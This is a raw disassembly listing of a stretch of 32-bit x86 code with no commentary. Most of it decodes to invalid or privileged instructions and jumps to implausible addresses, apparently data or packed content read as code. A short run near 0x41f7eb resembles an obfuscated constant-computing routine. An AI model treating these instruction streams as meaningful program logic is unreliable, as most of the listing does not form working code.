  41f517:	neg    al
  41f519:	add    esi,ecx
  41f51b:	in     al,dx
  41f51c:	(bad)  
  41f51e:	cmc    
  41f51f:	rcl    dh,0xe4
  41f522:	inc    BYTE PTR ds:0xb0907d4
  41f528:	jmp    0xc224e10e
  41f52d:	imul   DWORD PTR [ecx-0x2c480a2e]
  41f533:	int    0xd2
  41f535:	rcr    ebp,1
  41f537:	idiv   BYTE PTR [esi-0x2aff3048]
  41f53d:	ret    
  41f53e:	fcmovb st,st(0)
  41f540:	(bad)  
  41f541:	hlt    
  41f542:	stc    
  41f543:	fdiv   st,st(4)
  41f545:	adc    ecx,DWORD PTR [eax+ebx*8]
  41f548:	ffreep st(7)
  41f54a:	not    ebp
  41f54c:	mov    ecx,0xeec1eed3
  41f552:	retf   
  41f553:	mov    al,0xd8
  41f555:	cli    
  41f556:	mov    edx,0xf203f4df
  41f55b:	rcl    cl,cl
  41f55d:	stc    
  41f55e:	mov    ebp,0x900e7c7
  41f563:	add    ebp,edi
  41f565:	aam    0xdf
  41f567:	cli    
  41f568:	repnz shr DWORD PTR [ebp-0x152a3e2b],0xd6
  41f570:	int3   
  41f571:	repz fidiv WORD PTR [ebp-0x132f1b16]
  41f578:	fild   WORD PTR [ebx]
  41f57a:	mov    esi,0xf7fcf1e1
  41f57f:	loopne 0x41f57a
  41f581:	dec    DWORD PTR [eax]
  41f583:	fcmove st,st(7)
  41f585:	(bad)  
  41f586:	in     eax,dx
  41f587:	faddp  st(6),st
  41f589:	scas   al,BYTE PTR es:[edi]
  41f58a:	test   al,0xe6
  41f58c:	enter  0xfbb1,0xc8
  41f590:	imul   dh
  41f592:	fsubr  st,st(2)
  41f594:	hlt    
  41f595:	into   
  41f596:	fst    st(1)
  41f598:	cld    
  41f599:	iret   
  41f59a:	mul    ecx
  41f59c:	in     eax,dx
  41f59d:	shr    bl,1
  41f59f:	std    
  41f5a0:	add    al,0xc9
  41f5a2:	clc    
  41f5a3:	aad    0xf
  41f5a5:	int    0xe
  41f5a7:	fdiv   DWORD PTR [edx-0x392f1112]
  41f5ad:	iret   
  41f5ae:	out    dx,eax
  41f5af:	in     al,0xb0
  41f5b1:	cmc    
  41f5b2:	(bad)  
  41f5b3:	repz iret 
  41f5b5:	(bad)  
  41f5b7:	aad    0xe1
  41f5b9:	fld    QWORD PTR [eax]
  41f5bb:	in     eax,0xc1
  41f5bd:	(bad)  
  41f5be:	rol    bl,1
  41f5c0:	(bad)  
  41f5c1:	mov    esi,0xfdd08db
  41f5c6:	cli    
  41f5c7:	stc    
  41f5c8:	repnz (bad) 
  41f5ca:	loop   0x41f5ba
  41f5cc:	hlt    
  41f5cd:	iret   
  41f5ce:	sar    ebx,0xb1
  41f5d1:	mov    eax,0xf7deedfb
  41f5d6:	shl    ecx,cl
  41f5d8:	leave  
  41f5d9:	add    ecx,ebp
  41f5db:	sar    ebx,1
  41f5dd:	repnz hlt 
  41f5df:	pop    es
  41f5e0:	add    al,0xeb
  41f5e2:	std    
  41f5e3:	enter  0xccca,0xe1
  41f5e7:	rcl    ebx,cl
  41f5e9:	jmp    0x41f5a8
  41f5eb:	icebp  
  41f5ec:	scas   al,BYTE PTR es:[edi]
  41f5ed:	ret    
  41f5ee:	mov    cl,0xd2
  41f5f0:	stc    
  41f5f1:	mov    ebx,0xeae9efcc
  41f5f6:	out    dx,al
  41f5f7:	jmp    0xc5fd:0xdbddc8d8
  41f5fe:	ror    BYTE PTR [edx],cl
  41f600:	fadd   st,st(0)
  41f602:	enter  0xfe5,0xd9
  41f606:	int    0xcf
  41f608:	fsub   QWORD PTR [esi-0x19371a41]
  41f60e:	in     eax,0xd4
  41f610:	jmp    0x41f5e7
  41f612:	stc    
  41f613:	iret   
  41f614:	fdivp  st(3),st
  41f616:	fsubr  st(1),st
  41f618:	hlt    
  41f619:	stc    
  41f61a:	int    0xbe
  41f61c:	out    0xd8,eax
  41f61e:	loop   0x41f5e1
  41f620:	loopne 0x41f5f7
  41f622:	test   BYTE PTR ds:0xf2ecc9c4,0xe5
  41f629:	retf   
  41f62a:	shr    DWORD PTR [esi-0x2912304b],cl
  41f630:	(bad)  
  41f632:	aad    0xf6
  41f634:	mov    edi,0xb9f5cbd1
  41f639:	fprem  
  41f63b:	sti    
  41f63c:	(bad)  
  41f63d:	mov    esp,0xd0e504bd
  41f642:	(bad)  
  41f643:	dec    bh
  41f645:	or     edx,edi
  41f647:	adc    ah,BYTE PTR [edi-0x16484023]
  41f64d:	mov    dh,0xd3
  41f64f:	hlt    
  41f650:	mov    ah,0xb5
  41f652:	out    dx,eax
  41f653:	xlat   BYTE PTR ds:[ebx]
  41f654:	retf   
  41f655:	aad    0x3
  41f657:	repz out dx,al
  41f659:	cmc    
  41f65a:	push   es
  41f65b:	mov    esi,0xe304d4fa
  41f660:	retf   0xe4c7
  41f663:	sar    al,0xfb
  41f666:	adc    bh,al
  41f668:	ror    ebp,0xe4
  41f66b:	mov    cl,0xc5
  41f66d:	sti    
  41f66e:	lods   al,BYTE PTR ds:[esi]
  41f66f:	retf   
  41f670:	retf   0xc9c5
  41f673:	(bad)  
  41f675:	fdivr  st(1),st
  41f677:	fcomp  st(4)
  41f679:	repnz cmc 
  41f67b:	clc    
  41f67c:	add    eax,0xcae2f306
  41f681:	neg    al
  41f683:	add    ebx,ebp
  41f685:	leave  
  41f686:	repnz int 0xc5
  41f689:	in     al,dx
  41f68a:	int    0xbe
  41f68c:	ret    
  41f68d:	les    esi,FWORD PTR [edx-0x39004613]
  41f693:	jmp    0xfa16c46d
  41f698:	fdiv   st(3),st
  41f69a:	out    dx,eax
  41f69b:	int    0x5
  41f69d:	stc    
  41f69e:	rol    BYTE PTR [eax],1
  41f6a0:	add    ah,dl
  41f6a2:	retf   0xef4
  41f6a5:	vpsubsb xmm6,xmm4,XMMWORD PTR [ecx-0x1b333e34]
  41f6ad:	leave  
  41f6ae:	in     al,dx
  41f6af:	in     al,dx
  41f6b0:	sar    BYTE PTR [eax-0x334c2446],cl
  41f6b6:	int3   
  41f6b7:	repz ror eax,1
  41f6ba:	in     al,dx
  41f6bb:	ret    
  41f6bc:	add    eax,0xffd0fcf3
  41f6c1:	div    esi
  41f6c3:	add    al,0xfa
  41f6c5:	loope  0x41f6cc
  41f6c7:	in     al,0xbc
  41f6c9:	fdivr  QWORD PTR [esi-0x2e2a4d23]
  41f6cf:	lods   al,BYTE PTR ds:[esi]
  41f6d0:	(bad)  
  41f6d1:	enter  0xd2fb,0xd3
  41f6d5:	clc    
  41f6d6:	fcmovnu st,st(2)
  41f6d8:	mov    edi,0xf8fde2d1
  41f6dd:	add    al,0xf2
  41f6df:	loope  0x41f6b7
  41f6e1:	fstp   st(6)
  41f6e3:	jmp    0xa6eb:0xd8d8c6fb
  41f6ea:	mov    esp,0xccefc6c4
  41f6ef:	jmp    0xcdf7cfbe
  41f6f4:	xlat   BYTE PTR ds:[ebx]
  41f6f5:	ror    ebp,cl
  41f6f7:	aam    0xbb
  41f6f9:	neg    ecx
  41f6fb:	icebp  
  41f6fc:	add    ah,ah
  41f6fe:	(bad)  
  41f6ff:	aam    0xd6
  41f701:	fsub   st(3),st
  41f703:	or     ebx,esi
  41f705:	or     ch,dl
  41f707:	into   
  41f708:	int3   
  41f709:	shl    DWORD PTR [edx-0x1a4b1452],0xac
  41f710:	xlat   BYTE PTR ds:[ebx]
  41f711:	leave  
  41f712:	hlt    
  41f713:	mov    ah,0xd9
  41f715:	test   BYTE PTR [ebx],0xef
  41f718:	loop   0x41f6d3
  41f71a:	fsubrp st(1),st
  41f71c:	vpsllw xmm6,xmm5,xmm4
  41f720:	jmp    0x41f712
  41f722:	loop   0x41f709
  41f724:	mov    esp,0xeec5eaef
  41f72a:	loopne 0x41f6ee
  41f72c:	(bad)
  41f72f:	cli    
  41f730:	mov    ah,0xcb
  41f732:	out    0xea,eax
  41f734:	mov    edi,0xfff2d0b8
  41f739:	add    esp,ebx
  41f73b:	(bad)  
  41f73c:	mov    esp,0xc6c0f4f4
  41f741:	out    0xe8,eax
  41f743:	out    0xda,al
  41f745:	(bad)  
  41f746:	jmp    0x41f726
  41f748:	retf   0xdeaf
  41f74b:	into   
  41f74c:	jmp    0xfad2:0xc5cde7ec
  41f753:	(bad)  
  41f754:	test   esp,0xc1f6babb
  41f75a:	iret   
  41f75b:	icebp  
  41f75c:	(bad)  
  41f75d:	push   es
  41f75e:	lock ror BYTE PTR [ecx],1
  41f761:	pop    es
  41f762:	call   0xf4fcd41
  41f767:	out    0xab,al
  41f769:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f76a:	out    dx,al
  41f76b:	mov    esi,0xeec5f0dd
  41f770:	mov    bh,0xcf
  41f772:	(bad)  
  41f773:	sar    DWORD PTR [ebx-0x3737170f],cl
  41f779:	hlt    
  41f77a:	aad    0x0
  41f77c:	int3   
  41f77d:	loope  0x41f78a
  41f77f:	jmp    0xf9430069
  41f784:	out    0xdc,eax
  41f786:	std    
  41f787:	pmaxub mm4,mm3
  41f78a:	shl    al,cl
  41f78c:	repz iret 
  41f78e:	jecxz  0x41f771
  41f790:	(bad)  
  41f791:	into   
  41f792:	mov    ch,0xb5
  41f794:	retf   0xbfcb
  41f797:	cld    
  41f798:	rcr    ebp,0xfa
  41f79b:	sti    
  41f79c:	loop   0x41f75f
  41f79e:	mov    ecx,0xd6e1bfd6
  41f7a3:	or     esi,edi
  41f7a5:	add    al,0x6
  41f7a7:	out    0xe0,al
  41f7a9:	lods   eax,DWORD PTR ds:[esi]
  41f7aa:	sar    BYTE PTR [ecx+esi*4-0x1b363750],0xe5
  41f7b2:	lods   eax,DWORD PTR ds:[esi]
  41f7b3:	in     al,dx
  41f7b4:	lock in al,0xb4
  41f7b7:	mov    esi,0x307d4ed
  41f7bc:	push   es
  41f7bd:	(bad)  
  41f7be:	aam    0xa
  41f7c0:	lock neg ah
  41f7c3:	(bad)  
  41f7c4:	fimul  DWORD PTR [edx]
  41f7c6:	fsubr  st,st(4)
  41f7c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7c9:	enter  0xf2f7,0xd7
  41f7cd:	leave  
  41f7ce:	shl    esi,1
  41f7d0:	shl    bl,0xcb
  41f7d3:	(bad)  
  41f7d4:	jmp    0x41f7ba
  41f7d6:	stc    
  41f7d7:	add    al,BYTE PTR [eax]
  41f7d9:	add    bh,dl
  41f7db:	add    eax,0xf9cbe6f9
  41f7e0:	loopne 0x41f7e4
  41f7e2:	(bad)  
  41f7e3:	stc    
  41f7e4:	or     cl,BYTE PTR [edi]
  41f7e6:	and    DWORD PTR [edi],0x24
  41f7e9:	add    BYTE PTR [eax],al
  41f7eb:	mov    eax,DWORD PTR [ebp-0x138]
  41f7f1:	sub    eax,0x3272fb
  41f7f6:	xor    eax,0x75108b5
  41f7fb:	add    eax,0x7f55d8f2
  41f800:	mov    ecx,DWORD PTR [ebp-0x138]
  41f806:	mov    DWORD PTR [ebp+ecx*4-0x130],eax
  41f80d:	mov    eax,DWORD PTR [ebp-0x138]
  41f813:	cmp    DWORD PTR [ebp+eax*4-0x130],0x244ecb9d
  41f81e:	jbe    0x421bee
  41f824:	jmp    0x421bca
  41f829:	retf   0x3386
  41f82c:	sub    esi,DWORD PTR [edi+0x2e]
  41f82f:	shl    BYTE PTR [esi+0x7c],cl
  41f832:	inc    esi
  41f834:	jnp    0x41f7f7
  41f836:	enter  0x2db0,0xd6
  41f83a:	and    edi,DWORD PTR [edx+0x7b]
  41f83d:	add    bl,BYTE PTR [eax-0x12028485]
  41f843:	add    eax,0xd7e6acee
  41f848:	lods   al,BYTE PTR ds:[esi]
  41f849:	(bad)
  41f84c:	mov    ebx,0xdfcae8d3
  41f851:	(bad)  
  41f852:	fcmovbe st,st(6)
  41f854:	mov    esi,0xf3d6c1de
  41f859:	cld    
  41f85a:	rol    BYTE PTR [edx],1
  41f85c:	rcr    bl,0xff
  41f85f:	in     al,0xea
  41f861:	retf   0xdec4
  41f864:	loopne 0x41f855
  41f866:	ret    0xd1f1
  41f869:	repz in eax,0xba
  41f86c:	loopne 0x41f868
  41f86e:	repz aam 0xf2
  41f871:	(bad)  
  41f873:	ret    
  41f874:	loopne 0x41f850
  41f876:	fdiv   st(0),st
  41f878:	out    0xc7,eax
  41f87a:	pop    es
  41f87b:	repnz in al,0xeb
  41f87e:	retf   0x607
  41f881:	mov    BYTE PTR [edx+edx*1],0xf2
  41f885:	jmp    0x41f849
  41f887:	enter  0xb5f6,0xd1
  41f88b:	mov    ch,0xe4
  41f88d:	out    dx,al
  41f88e:	retf   0xeffd
  41f891:	fst    st(7)
  41f893:	cmc    
  41f894:	add    ebp,ebx
  41f896:	mov    esi,0xfe0b00d1
  41f89b:	inc    DWORD PTR [ecx+ecx*1]
  41f89e:	out    0x1,al
  41f8a0:	mov    BYTE PTR [eax],0xe7
  41f8a3:	retf   
  41f8a4:	loope  0x41f868
  41f8a6:	(bad)  
  41f8a7:	out    0xd0,eax
  41f8a9:	loopne 0x41f892
  41f8ab:	call   0xd32eeca0
  41f8b0:	mov    edi,0xb9d8d4dd
  41f8b5:	mov    ecx,0xd3c3f9d0
  41f8ba:	repnz sar edi,1
  41f8bd:	out    0xc4,al
  41f8bf:	prefetch (bad)
  41f8c0:	or     eax,0xcfc0cec5
  41f8c5:	stos   BYTE PTR es:[edi],al
  41f8c6:	loop   0x41f8b6
  41f8c8:	out    0xd6,eax
  41f8ca:	shl    BYTE PTR [ecx-0x36082847],0xf3
  41f8d1:	mov    dh,0x3
  41f8d3:	hlt    
  41f8d4:	fdivr  st,st(0)
  41f8d6:	fsub   st,st(7)
  41f8d8:	mov    edi,0xe1f5b9d6
  41f8dd:	add    ah,ah
  41f8df:	in     eax,0xe7
  41f8e1:	or     bl,bh
  41f8e3:	jmp    0x41f8a5
  41f8e5:	loope  0x41f8a5
  41f8e7:	in     eax,0xe3
  41f8e9:	icebp  
  41f8ea:	shr    bh,1
  41f8ec:	(bad)  
  41f8ed:	mov    ebx,0xfab3ccc5
  41f8f2:	repz push esi
  41f8f5:	inc    BYTE PTR [eax]
  41f8f7:	add    eax,esi
  41f8f9:	fadd   DWORD PTR [ecx]
  41f8fb:	jmp    0xe44dedf4
  41f900:	in     eax,0xe3
  41f902:	cli    
  41f903:	into   
  41f904:	shl    dl,1
  41f906:	mov    esp,0xcbe8ecea
  41f90b:	enter  0xcdb2,0xb8
  41f90f:	cli    
  41f910:	in     eax,dx
  41f911:	int3   
  41f912:	enter  0xb7d8,0xe7
  41f916:	lock jecxz 0x41f8ea
  41f919:	jecxz  0x41f914
  41f91b:	loop   0x41f8fd
  41f91d:	or     eax,ecx
  41f91f:	aam    0xf9
  41f921:	cli    
  41f922:	fcomip st,st(3)
  41f924:	in     eax,dx
  41f925:	jecxz  0x41f8d3
  41f927:	ret    0xc2f1
  41f92a:	iret   
  41f92b:	stc    
  41f92c:	rol    ah,0xd3
  41f92f:	mov    ebx,0xefd1f4b9
  41f934:	xlat   BYTE PTR ds:[ebx]
  41f935:	mov    edi,0xd7fe01dd
  41f93a:	inc    BYTE PTR [edx]
  41f93c:	(bad)
  41f93f:	jmp    0xe22e0431
  41f944:	repnz mov esi,0xb1f2cac1
  41f94a:	lods   eax,DWORD PTR ds:[esi]
  41f94b:	into   
  41f94c:	(bad)  
  41f94d:	out    dx,eax
  41f94e:	retf   
  41f94f:	out    0xde,al
  41f951:	sar    cl,1
  41f953:	jmp    0xdbde:0xb8f5d6ff
  41f95a:	retf   
  41f95b:	cld    
  41f95c:	retf   
  41f95d:	pop    es
  41f95e:	fucom  st(7)
  41f960:	out    0xea,al
  41f962:	inc    BYTE PTR ds:0xebe4f2cc
  41f968:	cmc    
  41f969:	fcmovnb st,st(3)
  41f96b:	in     al,dx
  41f96c:	cli    
  41f96d:	int    0xb6
  41f96f:	fucompp 
  41f971:	mov    dh,0xbb
  41f973:	(bad)  
  41f974:	loopne 0x41f979
  41f976:	ret    
  41f977:	sar    dh,1
  41f979:	(bad)  
  41f97a:	in     al,0xc4
  41f97c:	retf   0xc8e2
  41f97f:	fisttp QWORD PTR [ecx+edi*8]
  41f982:	add    al,0xc
  41f984:	mov    esp,0xd1d0bdd3
  41f989:	ret    
  41f98a:	mov    dh,0xcb
  41f98c:	sti    
  41f98d:	shr    edi,1
  41f98f:	in     eax,0xca
  41f991:	in     al,dx
  41f992:	cld    
  41f993:	div    dl
  41f995:	neg    al
  41f997:	into   
  41f998:	int3   
  41f999:	out    0x5,al
  41f99b:	in     eax,0xf9
  41f99d:	cmc    
  41f99e:	(bad)  
  41f9a0:	aad    0x6
  41f9a2:	in     al,dx
  41f9a3:	icebp  
  41f9a4:	stos   BYTE PTR es:[edi],al
  41f9a5:	out    dx,eax
  41f9a6:	retf   0xe7f5
  41f9a9:	jmp    0x41f99d
  41f9ab:	sti    
  41f9ac:	repz aam 0xee
  41f9af:	in     eax,0xf3
  41f9b1:	aam    0xcf
  41f9b3:	int3   
  41f9b4:	add    edi,DWORD PTR [eax-0x1f244712]
  41f9ba:	sti    
  41f9bb:	ret    0xe3c5
  41f9be:	or     ebx,ebp
  41f9c0:	(bad)  
  41f9c1:	int    0xc4
  41f9c3:	iret   
  41f9c4:	test   al,0xd2
  41f9c6:	icebp  
  41f9c7:	lods   al,BYTE PTR ds:[esi]
  41f9c8:	enter  0xe4c2,0xc7
  41f9cc:	rol    al,0xf1
  41f9cf:	mov    eax,0xd9caddec
  41f9d4:	enter  0xd7fc,0xfb
  41f9d8:	out    0xd8,eax
  41f9da:	shl    edx,0xe4
  41f9dd:	(bad)  
  41f9de:	aam    0xc7
  41f9e0:	(bad)  
  41f9e1:	(bad)  
  41f9e2:	fucomp st(2)
  41f9e4:	fcomp  st(5)
  41f9e6:	loope  0x41f9c5
  41f9e8:	loope  0x41f9e1
  41f9ea:	aam    0xf7
  41f9ec:	out    dx,al
  41f9ed:	(bad)  
  41f9ee:	in     eax,dx
  41f9ef:	xlat   BYTE PTR ds:[ebx]
  41f9f0:	icebp  
  41f9f1:	fcmovnbe st,st(5)
  41f9f3:	in     eax,dx
  41f9f4:	mov    ebx,0xc5f2f0d4
  41f9f9:	(bad)
  41f9fc:	out    0xc6,al
  41f9fe:	jmp    0xd0e3:0xd05c3c4
  41fa05:	loop   0x41f9ec
  41fa07:	(bad)
  41fa0a:	cmc    
  41fa0b:	jmp    0xdbfdafca
  41fa10:	aad    0xdc
  41fa12:	jecxz  0x41f9e7
  41fa14:	clc    
  41fa15:	shr    esp,0xee
  41fa18:	inc    DWORD PTR [ebx]
  41fa1a:	add    ebx,ebp
  41fa1c:	add    BYTE PTR [ecx],al
  41fa1e:	(bad)  
  41fa1f:	add    al,BYTE PTR [ecx]
  41fa21:	clc    
  41fa22:	cld    
  41fa23:	out    0xa7,al
  41fa25:	ret    0xf2dd
  41fa28:	ret    
  41fa29:	mov    bl,0xc2
  41fa2b:	retf   0xbab2
  41fa2e:	shr    ch,cl
  41fa30:	cli    
  41fa31:	mov    ecx,0xcee9eaf3
  41fa36:	aam    0xf6
  41fa38:	cmc    
  41fa39:	cmc    
  41fa3a:	(bad)  
  41fa3c:	xlat   BYTE PTR ds:[ebx]
  41fa3d:	out    0xef,eax
  41fa3f:	push   es
  41fa40:	hlt    
  41fa41:	loopne 0x41fa21
  41fa43:	shl    al,0xaa
  41fa46:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa48:	retf   
  41fa49:	stos   BYTE PTR es:[edi],al
  41fa4a:	out    0xd2,al
  41fa4c:	(bad)  
  41fa4d:	out    dx,al
  41fa4e:	leave  
  41fa4f:	stc    
  41fa50:	vpaddw xmm5,xmm0,xmm5
  41fa54:	mov    eax,0xcdbd07f1
  41fa59:	(bad)  
  41fa5a:	(bad)  
  41fa5c:	fmul   QWORD PTR [edx]
  41fa5e:	jmp    0x41fa45
  41fa60:	loopne 0x41fa48
  41fa62:	add    al,0xfe
  41fa64:	mov    ebp,0xd5cca5bd
  41fa69:	int    0xb2
  41fa6b:	in     eax,0xc4
  41fa6d:	call   0xc500e15e
  41fa72:	lock loop 0x41fa47
  41fa75:	(bad)  
  41fa77:	(bad)  
  41fa78:	aam    0xc2
  41fa7a:	add    edi,eax
  41fa7c:	cld    
  41fa7d:	retf   
  41fa7e:	add    edx,ebp
  41fa80:	sti    
  41fa81:	or     ah,al
  41fa83:	or     eax,eax
  41fa85:	leave  
  41fa86:	(bad)  
  41fa87:	ror    dh,cl
  41fa89:	retf   
  41fa8a:	rol    dh,cl
  41fa8c:	shl    DWORD PTR [ebp-0x113a2a35],0xce
  41fa93:	ret    0xd9c1
  41fa96:	test   ah,0xe5
  41fa99:	vpmuludq xmm7,xmm7,xmm4
  41fa9d:	fucomip st,st(3)
  41fa9f:	out    0xdf,al
  41faa1:	fsubp  st(3),st
  41faa3:	push   cs
  41faa4:	icebp  
  41faa5:	test   al,0xc7
  41faa7:	(bad)  [ebp-0x4c482d1e]
  41faad:	iret   
  41faae:	jmp    0xdf39c490
  41fab3:	int    0xfd
  41fab5:	rcl    ebp,1
  41fab7:	in     eax,dx
  41fab8:	fdivrp st(4),st
  41faba:	(bad)  
  41fabc:	fcmovu st,st(3)
  41fabe:	jecxz  0x41fac3
  41fac0:	ret    
  41fac1:	(bad)
  41fac5:	fmul   st,st(1)
  41fac7:	into   
  41fac8:	icebp  
  41fac9:	loop   0x41fab0
  41facb:	div    bl
  41facd:	repnz int3 
  41facf:	std    
  41fad0:	repnz cli 
  41fad2:	aad    0xe9
  41fad4:	jmp    0x827dab8
  41fad9:	add    dh,bl
  41fadb:	cld    
  41fadc:	inc    DWORD PTR [ecx+ebx*8]
  41fadf:	out    0xc,al
  41fae1:	or     ch,cl
  41fae3:	in     al,dx
  41fae4:	retf   
  41fae5:	fbstp  TBYTE PTR [ebx-0xa525024]
  41faeb:	cli    
  41faec:	cli    
  41faed:	shr    esp,1
  41faef:	fidivr DWORD PTR [ebp-0x1e032244]
  41faf5:	clc    
  41faf6:	aad    0xf0
  41faf8:	mov    esp,0xbfd7c3e2
  41fafd:	pop    es
  41fafe:	loope  0x41fb0f
  41fb00:	out    0xca,eax
  41fb02:	out    0xc8,al
  41fb04:	shl    dl,cl
  41fb06:	ret    0xf4e0
  41fb09:	jmp    0xe4e6:0xc6c6bbea
  41fb10:	aam    0xc9
  41fb12:	cld    
  41fb13:	out    dx,eax
  41fb14:	hlt    
  41fb15:	xlat   BYTE PTR ds:[ebx]
  41fb16:	rcr    edx,0x4
  41fb19:	(bad)  
  41fb1b:	fmul   st(3),st
  41fb1d:	pavgb  mm4,mm0
  41fb20:	add    BYTE PTR [eax],al
  41fb22:	(bad)  
  41fb24:	in     eax,dx
  41fb25:	jmp    0xc532b7fb
  41fb2a:	mov    cl,0xd7
  41fb2c:	jmp    0x41faf3
  41fb2e:	(bad)  
  41fb2f:	sar    ebx,cl
  41fb31:	(bad)  
  41fb33:	std    
  41fb34:	icebp  
  41fb35:	loopne 0x41fb0f
  41fb37:	loope  0x41fafc
  41fb39:	mov    esp,0xef020bdd
  41fb3e:	fsubp  st(5),st
  41fb40:	jmp    0xae2be549
  41fb45:	(bad)  
  41fb47:	lock test ch,0xe4
  41fb4b:	out    dx,eax
  41fb4c:	lds    esi,FWORD PTR [ebp-0x29374f45]
  41fb52:	in     eax,dx
  41fb53:	iret   
  41fb54:	(bad)  
  41fb55:	mov    esi,0xdcd7f1d8
  41fb5a:	(bad)  
  41fb5b:	cld    
  41fb5c:	loope  0x41fb47
  41fb5e:	retf   0x5fb
  41fb61:	in     eax,dx
  41fb62:	clc    
  41fb63:	leave  
  41fb64:	loope  0x41fb13
  41fb66:	in     al,dx
  41fb67:	out    0xc5,al
  41fb69:	aad    0xb1
  41fb6b:	test   al,0xee
  41fb6d:	aad    0xf4
  41fb6f:	mov    edx,0xd0f803fc
  41fb74:	fsubrp st(3),st
  41fb76:	rcl    ecx,1
  41fb78:	sar    ecx,0xf6
  41fb7b:	fdiv   st,st(0)
  41fb7d:	ret    0x7e5
  41fb80:	fsubrp st(0),st
  41fb82:	retf   0xea05
  41fb85:	test   eax,0xeccce6c4
  41fb8a:	sti    
  41fb8b:	mov    cl,0xc1
  41fb8d:	mov    ch,0xcc
  41fb8f:	out    dx,al
  41fb90:	mov    edi,0xf5d0d0b5
  41fb95:	sti    
  41fb96:	(bad)  
  41fb97:	fiadd  WORD PTR [edi]
  41fb99:	clc    
  41fb9a:	mov    cl,0xca
  41fb9d:	add    al,0xcb
  41fb9f:	aad    0x7
  41fba1:	(bad)  
  41fba2:	dec    ch
  41fba4:	in     al,dx
  41fba5:	in     al,0xdd
  41fba7:	ret    
  41fba8:	enter  0xe2db,0xed
  41fbac:	in     al,dx
  41fbad:	shl    esi,cl
  41fbaf:	jmp    0xefda:0xfdecfded
  41fbb6:	(bad)  
  41fbb8:	inc    ebx
  41fbba:	neg    al
  41fbbc:	loop   0x41fbb8
  41fbbe:	aad    0xfe
  41fbc0:	add    ecx,edi
  41fbc2:	or     ecx,esi
  41fbc4:	into   
  41fbc5:	scas   eax,DWORD PTR es:[edi]
  41fbc6:	sar    DWORD PTR [esi-0x1b2b1c23],0xc6
  41fbcd:	(bad)  
  41fbce:	repnz out dx,eax
  41fbd0:	(bad)  
  41fbd2:	ret    
  41fbd3:	add    ch,al
  41fbd5:	xlat   BYTE PTR ds:[ebx]
  41fbd6:	ret    
  41fbd7:	fcmovnu st,st(7)
  41fbd9:	sti    
  41fbda:	mov    ebp,0xe8f8dff7
  41fbdf:	(bad)  
  41fbe1:	add    al,BYTE PTR [edi]
  41fbe3:	cli    
  41fbe4:	(bad)  
  41fbe5:	jmp    0x41fb97
  41fbe7:	jecxz  0x41fbcf
  41fbe9:	mov    dh,0xb1
  41fbeb:	mov    cl,0xb5
  41fbed:	shl    bl,cl
  41fbef:	fmulp  st(7),st
  41fbf1:	add    ecx,eax
  41fbf3:	mov    al,0xf1
  41fbf5:	mov    esp,0xf3c3f0bd
  41fbfa:	sti    
  41fbfb:	ret    0xd5c3
  41fbfe:	sti    
  41fbff:	enter  0xed00,0xe3
  41fc03:	fcompp 
  41fc05:	mov    bl,0xa5
  41fc07:	(bad)  
  41fc08:	aam    0xf5
  41fc0a:	mov    ebx,0xb9eff4b7
  41fc0f:	div    BYTE PTR [ebx-0x1d011636]
  41fc15:	icebp  
  41fc16:	loop   0x41fbf0
  41fc18:	cmc    
  41fc19:	push   es
  41fc1a:	mov    ebp,0xddc0caf8
  41fc1f:	or     eax,0xeee4cfd9
  41fc24:	bnd ret 0xb7cf
  41fc28:	out    dx,al
  41fc29:	jecxz  0x41fc22
  41fc2b:	mov    ah,0xf8
  41fc2d:	shr    edx,cl
  41fc2f:	sar    al,cl
  41fc31:	aam    0xcf
  41fc33:	not    edx
  41fc35:	int    0xdf
  41fc37:	loopne 0x41fc15
  41fc39:	(bad)  
  41fc3b:	rol    BYTE PTR [esi],cl
  41fc3d:	jmp    0xea4ed139
  41fc42:	out    dx,eax
  41fc43:	jmp    0x41fc36
  41fc45:	fdivrp st(3),st
  41fc47:	into   
  41fc48:	enter  0xc1f2,0xfa
  41fc4c:	enter  0xd3e6,0xba
  41fc50:	(bad)  
  41fc51:	fcmove st,st(6)
  41fc53:	ret    0xedbb
  41fc56:	add    ch,bh
  41fc58:	out    0xc5,eax
  41fc5a:	loopne 0x41fc61
  41fc5c:	ret    0xcbd9
  41fc5f:	aam    0xe4
  41fc61:	or     ecx,eax
  41fc63:	stc    
  41fc64:	loop   0x41fc2a
  41fc66:	shl    edi,0xed
  41fc69:	in     eax,0xe3
  41fc6b:	repnz icebp 
  41fc6d:	mov    ecx,0xfcd8f7cc
  41fc72:	loop   0x41fc4f
  41fc74:	mov    bh,0xd1
  41fc76:	mov    ch,0xe0
  41fc78:	repnz cmc 
  41fc7a:	mov    ecx,0xf6ebf907
  41fc7f:	rol    BYTE PTR [edi],0xe2
  41fc82:	add    dh,bl
  41fc84:	iret   
  41fc85:	scas   eax,DWORD PTR es:[edi]
  41fc86:	loopne 0x41fc6e
  41fc88:	shl    ch,0xf1
  41fc8b:	test   al,0xcc
  41fc8d:	in     al,dx
  41fc8e:	mov    edi,0xdad6c5ca
  41fc93:	out    dx,al
  41fc94:	leave  
  41fc95:	mov    eax,0xd2c6ddc2
  41fc9a:	or     eax,ebx
  41fc9c:	call   0xc71cff62
  41fca1:	or     eax,0xcfb8c0fe
  41fca6:	mov    esp,0xb7f3c1c2
  41fcab:	in     al,0xcc
  41fcad:	div    esp
  41fcaf:	cli    
  41fcb0:	(bad)  
  41fcb2:	fidivr WORD PTR [ebx-0x27193245]
  41fcb8:	add    dl,bl
  41fcba:	cmc    
  41fcbb:	loope  0x41fcc3
  41fcbd:	cmc    
  41fcbe:	aam    0xfe
  41fcc0:	push   es
  41fcc1:	or     bl,cl
  41fcc3:	jmp    0xb1f9bfa8
  41fcc8:	out    0xeb,eax
  41fcca:	call   0xe808f77b
  41fccf:	retf   0xbdf1
  41fcd2:	icebp  
  41fcd3:	shl    dl,1
  41fcd5:	call   0xfbfedfd9
  41fcda:	loopne 0x41fcd9
  41fcdc:	aam    0xfc
  41fcde:	hlt    
  41fcdf:	jmp    0xce4f00d1
  41fce4:	repnz loopne 0x41fcb4
  41fce7:	repnz retf 0xacd0
  41fceb:	idiv   dl
  41fced:	cli    
  41fcee:	shl    DWORD PTR [esi+edx*8-0x33220406],1
  41fcf5:	call   0xc228bed1
  41fcfa:	sar    dh,0xb
  41fcfd:	cmc    
  41fcfe:	cmc    
  41fcff:	std    
  41fd00:	int    0xc4
  41fd02:	(bad)
  41fd05:	scas   eax,DWORD PTR es:[edi]
